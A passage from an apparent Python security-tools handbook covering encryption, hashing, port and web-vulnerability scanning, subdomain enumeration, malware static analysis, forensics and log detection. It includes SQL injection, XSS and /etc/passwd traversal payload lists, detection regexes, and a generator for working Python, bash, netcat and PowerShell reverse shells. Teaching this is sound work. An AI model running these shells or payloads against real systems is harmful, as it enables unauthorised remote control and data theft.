        
        version = encrypted[0:1]
        if version != cls.VERSION:
            raise ValueError(f"Unsupported version: {version}")
        
        salt = encrypted[1:17]
        nonce = encrypted[17:29]
        ciphertext = encrypted[29:]
        
        key, _ = SecureEncryption.derive_key_from_password(password, salt)
        
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None)
```

### 4.2 Secure Hashing

```python
"""
hashing.py - Secure Hashing Module
"""
import hashlib
import hmac
import secrets
from typing import Tuple
from argon2 import PasswordHasher, Type
from argon2.exceptions import VerifyMismatchError


class SecureHashing:
    """
    Secure hashing utilities.
    
    For passwords: Use Argon2id (recommended) or bcrypt
    For data integrity: Use SHA-256 or SHA-3
    For MACs: Use HMAC-SHA256
    """
    
    # ==================== PASSWORD HASHING ====================
    
    @staticmethod
    def hash_password_argon2(password: str) -> str:
        """Hash password using Argon2id (recommended for passwords)."""
        ph = PasswordHasher(
            time_cost=3,
            memory_cost=65536,  # 64 MB
            parallelism=4,
            hash_len=32,
            type=Type.ID
        )
        return ph.hash(password)
    
    @staticmethod
    def verify_password_argon2(password: str, hash_string: str) -> bool:
        """Verify password against Argon2id hash."""
        ph = PasswordHasher()
        try:
            ph.verify(hash_string, password)
            return True
        except VerifyMismatchError:
            return False
    
    @staticmethod
    def needs_rehash_argon2(hash_string: str) -> bool:
        """Check if password hash needs to be updated."""
        ph = PasswordHasher(
            time_cost=3,
            memory_cost=65536,
            parallelism=4,
        )
        return ph.check_needs_rehash(hash_string)
    
    # ==================== DATA HASHING ====================
    
    @staticmethod
    def hash_sha256(data: bytes) -> str:
        """Hash data using SHA-256. NOT for passwords!"""
        return hashlib.sha256(data).hexdigest()
    
    @staticmethod
    def hash_sha3_256(data: bytes) -> str:
        """Hash data using SHA-3-256."""
        return hashlib.sha3_256(data).hexdigest()
    
    @staticmethod
    def hash_blake2b(data: bytes, key: bytes = None) -> str:
        """Hash data using BLAKE2b."""
        if key:
            h = hashlib.blake2b(data, key=key)
        else:
            h = hashlib.blake2b(data)
        return h.hexdigest()
    
    @staticmethod
    def hash_file(filepath: str, algorithm: str = 'sha256') -> str:
        """Calculate hash of a file."""
        algorithms = {
            'sha256': hashlib.sha256,
            'sha3_256': hashlib.sha3_256,
            'blake2b': hashlib.blake2b,
            'md5': hashlib.md5,  # Only for legacy compatibility!
        }
        
        if algorithm not in algorithms:
            raise ValueError(f"Unknown algorithm: {algorithm}")
        
        h = algorithms[algorithm]()
        
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        
        return h.hexdigest()
    
    # ==================== HMAC ====================
    
    @staticmethod
    def hmac_sha256(key: bytes, message: bytes) -> bytes:
        """Generate HMAC-SHA256 for message authentication."""
        return hmac.new(key, message, hashlib.sha256).digest()
    
    @staticmethod
    def verify_hmac(key: bytes, message: bytes, signature: bytes) -> bool:
        """Verify HMAC signature (constant-time comparison)."""
        expected = SecureHashing.hmac_sha256(key, message)
        return hmac.compare_digest(expected, signature)
    
    # ==================== TOKEN GENERATION ====================
    
    @staticmethod
    def generate_token(length: int = 32) -> str:
        """Generate a cryptographically secure random token."""
        return secrets.token_hex(length)
    
    @staticmethod
    def generate_url_token(length: int = 32) -> str:
        """Generate a URL-safe random token."""
        return secrets.token_urlsafe(length)
    
    @staticmethod
    def generate_api_key() -> str:
        """Generate an API key with prefix for identification."""
        random_part = secrets.token_hex(24)
        checksum = hashlib.sha256(random_part.encode()).hexdigest()[:4]
        return f"sk_{random_part}{checksum}"
    
    @staticmethod
    def verify_api_key(api_key: str) -> bool:
        """Verify API key format and checksum."""
        if not api_key.startswith("sk_") or len(api_key) != 55:
            return False
        
        random_part = api_key[3:51]
        checksum = api_key[51:]
        
        expected_checksum = hashlib.sha256(random_part.encode()).hexdigest()[:4]
        return hmac.compare_digest(checksum, expected_checksum)
```

---

## 5. Network Security Tools

### 5.1 Port Scanner

```python
"""
scanner.py - Secure Network Scanner
"""
import socket
import concurrent.futures
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import ipaddress


@dataclass
class ScanResult:
    """Result of a port scan."""
    host: str
    port: int
    is_open: bool
    service: str = ""
    banner: str = ""
    timestamp: datetime = field(default_factory=datetime.utcnow)


@dataclass
class HostScanResult:
    """Complete scan result for a host."""
    host: str
    open_ports: List[ScanResult] = field(default_factory=list)
    closed_ports: int = 0
    scan_time: float = 0.0


class NetworkScanner:
    """Secure network port scanner."""
    
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
        6379: "Redis", 8080: "HTTP-Alt", 27017: "MongoDB",
    }
    
    TOP_100_PORTS = [
        7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88,
        110, 111, 113, 119, 135, 139, 143, 179, 199, 389, 443,
        445, 465, 513, 514, 515, 543, 544, 548, 554, 587, 631,
        873, 990, 993, 995, 1025, 1433, 1720, 1723, 2000, 2049,
        3000, 3128, 3306, 3389, 5000, 5432, 5900, 6000, 8000,
        8008, 8080, 8443, 8888, 9999, 10000,
    ]
    
    def __init__(
        self,
        timeout: float = 2.0,
        max_workers: int = 100,
        grab_banner: bool = True
    ):
        self.timeout = timeout
        self.max_workers = max_workers
        self.grab_banner = grab_banner
    
    def _validate_target(self, target: str) -> str:
        """Validate and resolve target to IP address."""
        try:
            ipaddress.ip_address(target)
            return target
        except ValueError:
            try:
                ip = socket.gethostbyname(target)
                return ip
            except socket.gaierror:
                raise ValueError(f"Cannot resolve hostname: {target}")
    
    def _scan_port(self, host: str, port: int) -> ScanResult:
        """Scan a single port."""
        result = ScanResult(
            host=host,
            port=port,
            is_open=False,
            service=self.COMMON_PORTS.get(port, "unknown")
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            connection_result = sock.connect_ex((host, port))
            
            if connection_result == 0:
                result.is_open = True
                
                if self.grab_banner:
                    try:
                        if port in (80, 8080, 8000, 8008):
                            sock.send(b"HEAD / HTTP/1.1\r\nHost: " + 
                                     host.encode() + b"\r\n\r\n")
                        sock.settimeout(1.0)
                        banner = sock.recv(1024)
                        result.banner = banner.decode('utf-8', errors='ignore').strip()[:200]
                    except:
                        pass
            
            sock.close()
            
        except (socket.timeout, socket.error):
            pass
        
        return result
    
    def scan_host(
        self,
        target: str,
        ports: List[int] = None,
        port_range: Tuple[int, int] = None
    ) -> HostScanResult:
        """Scan a single host."""
        start_time = datetime.utcnow()
        
        host = self._validate_target(target)
        
        if ports is None and port_range is None:
            ports = self.TOP_100_PORTS
        elif port_range:
            ports = list(range(port_range[0], port_range[1] + 1))
        
        ports = [p for p in ports if 1 <= p <= 65535]
        
        result = HostScanResult(host=host)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(self._scan_port, host, port): port
                for port in ports
            }
            
            for future in concurrent.futures.as_completed(futures):
                scan_result = future.result()
                if scan_result.is_open:
                    result.open_ports.append(scan_result)
                else:
                    result.closed_ports += 1
        
        result.open_ports.sort(key=lambda x: x.port)
        result.scan_time = (datetime.utcnow() - start_time).total_seconds()
        
        return result


# Usage example
if __name__ == "__main__":
    scanner = NetworkScanner(timeout=1.0, max_workers=50)
    
    print("Scanning localhost...")
    result = scanner.scan_host("127.0.0.1", ports=[22, 80, 443, 3306, 5432, 8080])
    
    print(f"\nHost: {result.host}")
    print(f"Scan time: {result.scan_time:.2f}s")
    print(f"Open ports: {len(result.open_ports)}")
    
    for port_result in result.open_ports:
        print(f"  {port_result.port}/tcp - {port_result.service}")
```

---

## 6. Web Security Testing

### 6.1 Web Vulnerability Scanner

```python
"""
web_scanner.py - Web Vulnerability Scanner
"""
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Set
from dataclasses import dataclass, field
from bs4 import BeautifulSoup
import re
import warnings

warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)


@dataclass
class Vulnerability:
    """Represents a detected vulnerability."""
    type: str
    severity: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""


@dataclass
class ScanConfig:
    """Scanner configuration."""
    timeout: int = 10
    max_pages: int = 100
    threads: int = 10
    user_agent: str = "SecurityScanner/1.0"
    verify_ssl: bool = False


class WebVulnerabilityScanner:
    """Web application vulnerability scanner."""
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
    ]
    
    SQLI_ERRORS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"PostgreSQL.*ERROR",
        r"ORA-\d{5}",
        r"SQLite\/JDBCDriver",
        r"Unclosed quotation mark",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
    ]
    
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ]
    
    SECURITY_HEADERS = {
        "Strict-Transport-Security": {"severity": "High"},
        "X-Content-Type-Options": {"severity": "Medium"},
        "X-Frame-Options": {"severity": "Medium"},
        "Content-Security-Policy": {"severity": "Medium"},
    }
    
    def __init__(self, config: ScanConfig = None):
        self.config = config or ScanConfig()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": self.config.user_agent})
        self.session.verify = self.config.verify_ssl
        
        self.vulnerabilities: List[Vulnerability] = []
        self.crawled_urls: Set[str] = set()
    
    def check_security_headers(self, url: str) -> List[Vulnerability]:
        """Check for missing security headers."""
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=self.config.timeout)
            
            for header, config in self.SECURITY_HEADERS.items():
                if header not in response.headers:
                    vuln = Vulnerability(
                        type="Missing Security Header",
                        severity=config["severity"],
                        url=url,
                        parameter=header,
                        description=f"{header} header missing",
                        remediation=f"Add the {header} header"
                    )
                    vulnerabilities.append(vuln)
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_sqli(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities."""
        vulnerabilities = []
        
        for param_name in params:
            for payload in self.SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url, params=test_params, timeout=self.config.timeout
                    )
                    
                    for error_pattern in self.SQLI_ERRORS:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            vuln = Vulnerability(
                                type="SQL Injection",
                                severity="Critical",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=error_pattern,
                                remediation="Use parameterized queries"
                            )
                            vulnerabilities.append(vuln)
                            break
                except Exception:
                    pass
        
        return vulnerabilities
    
    def test_xss(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for XSS vulnerabilities."""
        vulnerabilities = []
        
        for param_name in params:
            for payload in self.XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(
                        url, params=test_params, timeout=self.config.timeout
                    )
                    
                    if payload in response.text:
                        vuln = Vulnerability(
                            type="Cross-Site Scripting (XSS)",
                            severity="High",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            remediation="Encode all user input"
                        )
                        vulnerabilities.append(vuln)
                        break
                except Exception:
                    pass
        
        return vulnerabilities
    
    def generate_report(self) -> str:
        """Generate vulnerability report."""
        report = []
        report.append("=" * 60)
        report.append("VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal vulnerabilities: {len(self.vulnerabilities)}")
        
        severities = {}
        for vuln in self.vulnerabilities:
            severities[vuln.severity] = severities.get(vuln.severity, 0) + 1
        
        report.append("\nBy Severity:")
        for sev in ["Critical", "High", "Medium", "Low"]:
            if sev in severities:
                report.append(f"  {sev}: {severities[sev]}")
        
        report.append("\n" + "-" * 60)
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            report.append(f"\n[{i}] {vuln.type}")
            report.append(f"    Severity: {vuln.severity}")
            report.append(f"    URL: {vuln.url}")
            if vuln.parameter:
                report.append(f"    Parameter: {vuln.parameter}")
            if vuln.remediation:
                report.append(f"    Remediation: {vuln.remediation}")
        
        return "\n".join(report)
```

---

## 7. Reconnaissance & OSINT

### 7.1 Subdomain Enumeration

```python
"""
recon.py - Reconnaissance Tools
"""
import dns.resolver
import requests
from typing import Dict, List, Set
from concurrent.futures import ThreadPoolExecutor, as_completed


class SubdomainEnumerator:
    """Subdomain enumeration using multiple techniques."""
    
    COMMON_SUBDOMAINS = [
        "www", "mail", "ftp", "admin", "api", "dev", "staging", "test",
        "blog", "shop", "store", "app", "mobile", "portal", "secure",
        "vpn", "remote", "cdn", "static", "assets", "images",
        "ns1", "ns2", "mx", "smtp", "pop", "imap", "webmail",
        "jenkins", "gitlab", "jira", "confluence", "grafana",
    ]
    
    def __init__(self, domain: str, timeout: int = 5, threads: int = 20):
        self.domain = domain
        self.timeout = timeout
        self.threads = threads
        self.found_subdomains: Set[str] = set()
    
    def bruteforce(self, wordlist: List[str] = None) -> Set[str]:
        """Bruteforce subdomains using wordlist."""
        if wordlist is None:
            wordlist = self.COMMON_SUBDOMAINS
        
        def check_subdomain(subdomain: str):
            full_domain = f"{subdomain}.{self.domain}"
            try:
                answers = dns.resolver.resolve(full_domain, 'A')
                if answers:
                    return full_domain
            except Exception:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(check_subdomain, sub): sub 
                for sub in wordlist
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.found_subdomains.add(result)
        
        return self.found_subdomains
    
    def from_certificate_transparency(self) -> Set[str]:
        """Get subdomains from Certificate Transparency logs."""
        subdomains = set()
        
        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            response = requests.get(url, timeout=self.timeout)
            
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name = entry.get('name_value', '')
                    for sub in name.split('\n'):
                        sub = sub.strip().lower()
                        if sub.endswith(self.domain) and '*' not in sub:
                            subdomains.add(sub)
        except Exception:
            pass
        
        self.found_subdomains.update(subdomains)
        return subdomains
    
    def get_dns_records(self, subdomain: str) -> Dict[str, List[str]]:
        """Get DNS records for a subdomain."""
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(subdomain, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
            except Exception:
                pass
        
        return records
```

---

## 8. Exploitation Frameworks

### 8.1 Exploit Development Helpers

```python
"""
exploit_helpers.py - Exploit Development Utilities
"""
import struct
from typing import List, Union


class ExploitHelper:
    """Utilities for exploit development."""
    
    @staticmethod
    def pattern_create(length: int) -> bytes:
        """Create a unique pattern for finding offsets."""
        pattern = b""
        chars_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        chars_lower = "abcdefghijklmnopqrstuvwxyz"
        chars_digit = "0123456789"
        
        for upper in chars_upper:
            for lower in chars_lower:
                for digit in chars_digit:
                    if len(pattern) >= length:
                        return pattern[:length]
                    pattern += f"{upper}{lower}{digit}".encode()
        
        return pattern[:length]
    
    @staticmethod
    def pattern_offset(pattern: bytes, value: Union[int, bytes]) -> int:
        """Find offset of value in pattern."""
        if isinstance(value, int):
            value = struct.pack("<I", value)
        
        offset = pattern.find(value)
        return offset if offset != -1 else None
    
    @staticmethod
    def pack32(value: int, endian: str = "little") -> bytes:
        """Pack 32-bit integer."""
        fmt = "<I" if endian == "little" else ">I"
        return struct.pack(fmt, value)
    
    @staticmethod
    def pack64(value: int, endian: str = "little") -> bytes:
        """Pack 64-bit integer."""
        fmt = "<Q" if endian == "little" else ">Q"
        return struct.pack(fmt, value)
    
    @staticmethod
    def shellcode_format(shellcode: bytes, format_type: str = "python") -> str:
        """Format shellcode for different languages."""
        if format_type == "python":
            return 'shellcode = b"' + ''.join(f'\\x{b:02x}' for b in shellcode) + '"'
        
        elif format_type == "c":
            lines = []
            for i in range(0, len(shellcode), 15):
                chunk = shellcode[i:i+15]
                line = '"' + ''.join(f'\\x{b:02x}' for b in chunk) + '"'
                lines.append(line)
            return 'unsigned char shellcode[] = \n' + '\n'.join(lines) + ';'
        
        elif format_type == "csharp":
            hex_values = ', '.join(f'0x{b:02x}' for b in shellcode)
            return f'byte[] shellcode = new byte[{len(shellcode)}] {{ {hex_values} }};'
        
        return shellcode.hex()
    
    @staticmethod
    def nop_sled(length: int, arch: str = "x86") -> bytes:
        """Generate NOP sled."""
        nops = {"x86": b"\x90", "x64": b"\x90"}
        nop = nops.get(arch, b"\x90")
        return nop * (length // len(nop))
    
    @staticmethod
    def rop_chain(gadgets: List[int], arch: str = "x86") -> bytes:
        """Build ROP chain from gadget addresses."""
        if arch == "x64":
            return b"".join(struct.pack("<Q", g) for g in gadgets)
        else:
            return b"".join(struct.pack("<I", g) for g in gadgets)


class ReverseShellGenerator:
    """Generate reverse shell payloads."""
    
    @staticmethod
    def python(host: str, port: int) -> str:
        """Python reverse shell."""
        return f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
    
    @staticmethod
    def bash(host: str, port: int) -> str:
        """Bash reverse shell."""
        return f'bash -i >& /dev/tcp/{host}/{port} 0>&1'
    
    @staticmethod
    def netcat(host: str, port: int) -> str:
        """Netcat reverse shell."""
        return f'nc -e /bin/sh {host} {port}'
    
    @staticmethod
    def powershell(host: str, port: int) -> str:
        """PowerShell reverse shell."""
        return f'''$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
```

---

## 9. Malware Analysis

### 9.1 Static Analysis

```python
"""
malware_analysis.py - Static Malware Analysis
"""
import hashlib
import pefile
import re
from pathlib import Path
from typing import Dict, List
from dataclasses import dataclass, field


@dataclass
class FileInfo:
    """Basic file information."""
    path: str
    size: int
    md5: str
    sha1: str
    sha256: str


@dataclass
class PEAnalysis:
    """PE file analysis results."""
    file_info: FileInfo
    is_dll: bool = False
    is_exe: bool = False
    is_packed: bool = False
    imports: Dict[str, List[str]] = field(default_factory=dict)
    exports: List[str] = field(default_factory=list)
    sections: List[dict] = field(default_factory=list)
    suspicious_imports: List[str] = field(default_factory=list)
    strings: List[str] = field(default_factory=list)
    urls: List[str] = field(default_factory=list)
    ips: List[str] = field(default_factory=list)


class MalwareAnalyzer:
    """Static malware analysis toolkit."""
    
    SUSPICIOUS_APIS = {
        "Process": ["CreateProcess", "OpenProcess", "TerminateProcess", 
                   "CreateRemoteThread", "WriteProcessMemory"],
        "Registry": ["RegCreateKey", "RegSetValue", "RegDeleteKey"],
        "Network": ["WSAStartup", "socket", "connect", "send", "recv",
                   "InternetOpen", "URLDownloadToFile"],
        "Crypto": ["CryptAcquireContext", "CryptEncrypt", "CryptDecrypt"],
        "Injection": ["VirtualAlloc", "VirtualProtect", "LoadLibrary",
                     "GetProcAddress", "SetWindowsHookEx"],
        "Evasion": ["IsDebuggerPresent", "CheckRemoteDebuggerPresent",
                   "NtQueryInformationProcess", "GetTickCount"],
    }
    
    URL_PATTERN = re.compile(rb'https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+')
    IP_PATTERN = re.compile(rb'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    
    def __init__(self, filepath: str):
        self.filepath = Path(filepath)
        if not self.filepath.exists():
            raise FileNotFoundError(f"File not found: {filepath}")
        
        self.data = self.filepath.read_bytes()
    
    def get_hashes(self) -> FileInfo:
        """Calculate file hashes."""
        return FileInfo(
            path=str(self.filepath),
            size=len(self.data),
            md5=hashlib.md5(self.data).hexdigest(),
            sha1=hashlib.sha1(self.data).hexdigest(),
            sha256=hashlib.sha256(self.data).hexdigest(),
        )
    
    def extract_strings(self, min_length: int = 4) -> List[str]:
        """Extract ASCII and Unicode strings."""
        strings = []
        
        ascii_pattern = re.compile(rb'[\x20-\x7E]{%d,}' % min_length)
        strings.extend(m.group().decode('ascii') for m in ascii_pattern.finditer(self.data))
        
        unicode_pattern = re.compile(rb'(?:[\x20-\x7E]\x00){%d,}' % min_length)
        for match in unicode_pattern.finditer(self.data):
            try:
                strings.append(match.group().decode('utf-16-le').rstrip('\x00'))
            except:
                pass
        
        return list(set(strings))
    
    def extract_urls(self) -> List[str]:
        """Extract URLs from binary."""
        urls = []
        for match in self.URL_PATTERN.finditer(self.data):
            try:
                urls.append(match.group().decode('utf-8'))
            except:
                pass
        return list(set(urls))
    
    def extract_ips(self) -> List[str]:
        """Extract IP addresses from binary."""
        ips = []
        for match in self.IP_PATTERN.finditer(self.data):
            ip = match.group().decode('ascii')
            octets = ip.split('.')
            if all(0 <= int(o) <= 255 for o in octets):
                ips.append(ip)
        return list(set(ips))
    
    def analyze_pe(self) -> PEAnalysis:
        """Perform PE file analysis."""
        file_info = self.get_hashes()
        
        try:
            pe = pefile.PE(data=self.data)
        except pefile.PEFormatError:
            raise ValueError("Not a valid PE file")
        
        analysis = PEAnalysis(file_info=file_info)
        analysis.is_dll = pe.is_dll()
        analysis.is_exe = pe.is_exe()
        
        for section in pe.sections:
            section_info = {
                "name": section.Name.decode().rstrip('\x00'),
                "virtual_address": hex(section.VirtualAddress),
                "entropy": section.get_entropy(),
            }
            analysis.sections.append(section_info)
            
            if section.get_entropy() > 7.0:
                analysis.is_packed = True
        
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode()
                functions = []
                for imp in entry.imports:
                    if imp.name:
                        func_name = imp.name.decode()
                        functions.append(func_name)
                        
                        for category, apis in self.SUSPICIOUS_APIS.items():
                            if func_name in apis:
                                analysis.suspicious_imports.append(
                                    f"{category}: {func_name}"
                                )
                
                analysis.imports[dll_name] = functions
        
        analysis.strings = self.extract_strings()[:100]
        analysis.urls = self.extract_urls()
        analysis.ips = self.extract_ips()
        
        pe.close()
        return analysis
```

---

## 10. Digital Forensics

### 10.1 Forensics Toolkit

```python
"""
forensics.py - Digital Forensics Utilities
"""
import os
import json
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List
from dataclasses import dataclass, field, asdict


@dataclass
class FileEvidence:
    """Digital evidence from a file."""
    path: str
    size: int
    md5: str
    sha256: str
    created: str
    modified: str
    accessed: str


@dataclass
class ForensicCase:
    """Forensic case container."""
    case_id: str
    investigator: str
    description: str
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    evidence: List[FileEvidence] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    chain_of_custody: List[dict] = field(default_factory=list)


class ForensicsToolkit:
    """Digital forensics utility toolkit."""
    
    def __init__(self, case_id: str, investigator: str, description: str = ""):
        self.case = ForensicCase(
            case_id=case_id,
            investigator=investigator,
            description=description
        )
    
    def acquire_file(self, filepath: str, notes: str = "") -> FileEvidence:
        """Acquire file as evidence with hash verification."""
        path = Path(filepath)
        if not path.exists():
            raise FileNotFoundError(f"File not found: {filepath}")
        
        stat = path.stat()
        
        with open(path, 'rb') as f:
            data = f.read()
            md5 = hashlib.md5(data).hexdigest()
            sha256 = hashlib.sha256(data).hexdigest()
        
        evidence = FileEvidence(
            path=str(path.absolute()),
            size=stat.st_size,
            md5=md5,
            sha256=sha256,
            created=datetime.fromtimestamp(stat.st_ctime).isoformat(),
            modified=datetime.fromtimestamp(stat.st_mtime).isoformat(),
            accessed=datetime.fromtimestamp(stat.st_atime).isoformat(),
        )
        
        self.case.evidence.append(evidence)
        
        self.case.chain_of_custody.append({
            "timestamp": datetime.utcnow().isoformat(),
            "action": "acquired",
            "file": str(path.name),
            "hash": sha256,
            "investigator": self.case.investigator,
            "notes": notes
        })
        
        return evidence
    
    def verify_integrity(self, evidence: FileEvidence) -> bool:
        """Verify file integrity using stored hash."""
        try:
            with open(evidence.path, 'rb') as f:
                current_hash = hashlib.sha256(f.read()).hexdigest()
            return current_hash == evidence.sha256
        except Exception:
            return False
    
    def add_note(self, note: str):
        """Add investigator note to case."""
        timestamp = datetime.utcnow().isoformat()
        self.case.notes.append(f"[{timestamp}] {note}")
    
    def export_case(self, output_path: str):
        """Export case to JSON file."""
        with open(output_path, 'w') as f:
            json.dump(asdict(self.case), f, indent=2)
```

---

## 11. Log Analysis & SIEM

### 11.1 Log Analyzer

```python
"""
log_analyzer.py - Security Log Analysis
"""
import re
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict
from dataclasses import dataclass


@dataclass
class LogEntry:
    """Parsed log entry."""
    timestamp: datetime
    source: str
    level: str
    message: str
    raw: str


@dataclass
class SecurityAlert:
    """Security alert from log analysis."""
    rule_name: str
    severity: str
    description: str
    count: int
    source_ips: List[str]


class LogAnalyzer:
    """Security log analyzer with rule-based detection."""
    
    LOG_PATTERNS = {
        'syslog': re.compile(
            r'^(?P<timestamp>\w+\s+\d+\s+\d+:\d+:\d+)\s+'
            r'(?P<host>\S+)\s+'
            r'(?P<process>\S+?)(?:\[\d+\])?: '
            r'(?P<message>.*)$'
        ),
        'apache_access': re.compile(
            r'^(?P<ip>\S+)\s+\S+\s+\S+\s+'
            r'\[(?P<timestamp>[^\]]+)\]\s+'
            r'"(?P<method>\S+)\s+(?P<path>\S+)\s+(?P<protocol>\S+)"\s+'
            r'(?P<status>\d+)\s+(?P<size>\S+)'
        ),
    }
    
    DETECTION_RULES = [
        {
            'name': 'SSH Brute Force',
            'pattern': re.compile(r'Failed password for .* from (\d+\.\d+\.\d+\.\d+)'),
            'threshold': 5,
            'severity': 'High',
        },
        {
            'name': 'SQL Injection Attempt',
            'pattern': re.compile(r'(?:UNION|SELECT|INSERT|DELETE|DROP).*(?:--|#)', re.I),
            'threshold': 1,
            'severity': 'Critical',
        },
        {
            'name': 'Directory Traversal',
            'pattern': re.compile(r'(?:\.\./|\.\.\\|%2e%2e)'),
            'threshold': 1,
            'severity': 'High',
        },
        {
            'name': 'XSS Attempt',
            'pattern': re.compile(r'<script|javascript:|onerror=', re.I),
            'threshold': 1,
            'severity': 'High',
        },
    ]
    
    def __init__(self):
        self.entries: List[LogEntry] = []
        self.alerts: List[SecurityAlert] = []
        self.stats = defaultdict(int)
    
    def parse_line(self, line: str, log_format: str = 'auto') -> Optional[LogEntry]:
        """Parse a single log line."""
        line = line.strip()
        if not line:
            return None
        
        for fmt, pattern in self.LOG_PATTERNS.items():
            match = pattern.match(line)
            if match:
                fields = match.groupdict()
                return LogEntry(
                    timestamp=datetime.now(),
                    source=fields.get('host', fields.get('ip', 'unknown')),
                    level=fields.get('level', 'INFO'),
                    message=fields.get('message', line),
                    raw=line,
                )
        
        return LogEntry(
            timestamp=datetime.now(),
            source='unknown',
            level='INFO',
            message=line,
            raw=line
        )
    
    def analyze_file(self, filepath: str) -> List[SecurityAlert]:
        """Analyze a log file for security events."""
        with open(filepath, 'r', errors='ignore') as f:
            for line in f:
                entry = self.parse_line(line)
                if entry:
                    self.entries.append(entry)
                    self._check_rules(entry)
        
        self._generate_alerts()
        return self.alerts
    
    def _check_rules(self, entry: LogEntry):
        """Check log entry against detection rules."""
        for rule in self.DETECTION_RULES:
            match = rule['pattern'].search(entry.raw)
            if match:
                key = f"{rule['name']}_{match.group(1) if match.groups() else 'all'}"
                self.stats[key] += 1
    
    def _generate_alerts(self):
        """Generate alerts from statistics."""
        rule_counts = defaultdict(lambda: {'count': 0, 'sources': set()})
        
        for key, count in self.stats.items():
            rule_name = key.rsplit('_', 1)[0]
            source = key.rsplit('_', 1)[1] if '_' in key else 'unknown'
            
            rule_counts[rule_name]['count'] += count
            rule_counts[rule_name]['sources'].add(source)
        
        for rule in self.DETECTION_RULES:
            if rule['name'] in rule_counts:
                data = rule_counts[rule['name']]
                if data['count'] >= rule['threshold']:
                    alert = SecurityAlert(
                        rule_name=rule['name'],
                        severity=rule['severity'],
                        description=f"Detected {data['count']} occurrences",
                        count=data['count'],
                        source_ips=list(data['sources']),
                    )
                    self.alerts.append(alert)
```

---

## 12. Automation & Scripting

### 12.1 Security Automation Framework

```python
"""
automation.py - Security Automation Framework
"""
import asyncio
import aiohttp
from typing import Callable, Dict, List, Any
from dataclasses import dataclass
from datetime import datetime
import json


@dataclass
class Task:
    """Automation task definition."""
    name: str
    func: Callable
    args: tuple = ()
    kwargs: dict = None
    enabled: bool = True


@dataclass
class TaskResult:
    """Task execution result."""
    task_name: str
    success: bool
    result: Any
    error: str = None
    duration: float = 0


class SecurityAutomation:
    """Security automation framework."""
    
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.results: List[TaskResult] = []
    
